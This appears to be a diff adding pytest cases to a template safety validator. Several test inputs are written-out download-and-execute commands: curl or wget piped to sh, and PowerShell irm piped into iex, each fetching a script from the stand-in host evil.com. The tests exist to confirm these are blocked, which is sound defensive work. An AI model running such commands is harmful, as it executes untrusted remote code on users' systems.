@@ -142,6 +142,20 @@ def test_micromamba_bootstrap_safe():
     result = validate_rendered_output(content, "setup.sh")
     assert result == content
 
+def test_curl_pipe_shell_with_options_blocked():
+    with pytest.raises(SafetyViolationError):
+        validate_rendered_output("curl -L https://evil.com/p.sh | sh", "test.sh.j2")
+
+def test_wget_pipe_shell_with_options_blocked():
+    with pytest.raises(SafetyViolationError):
+        validate_rendered_output("wget -qO- https://evil.com/p.sh | sh", "test.sh.j2")
+
+def test_powershell_irm_cradle_blocked():
+    with pytest.raises(SafetyViolationError):
+        validate_rendered_output("iex (irm http://evil.com/evil.ps1)", "test.ps1.j2")
+    with pytest.raises(SafetyViolationError):
+        validate_rendered_output("irm http://evil.com/evil.ps1 | iex", "test.ps1.j2")
+
 def test_uv_bootstrap_safe():
     """Ensure that uv boostrapping using curl to sh or Invoke-RestMethod is safe."""
     content_linux = "curl -LsSf https://astral.sh/uv/install.sh | sh"
@@ -149,4 +163,5 @@ def test_uv_bootstrap_safe():
 
     content_win = "Invoke-RestMethod https://astral.sh/uv/install.ps1 | Invoke-Expression"
     assert validate_rendered_output(content_win, "setup.ps1") == content_win
+
 
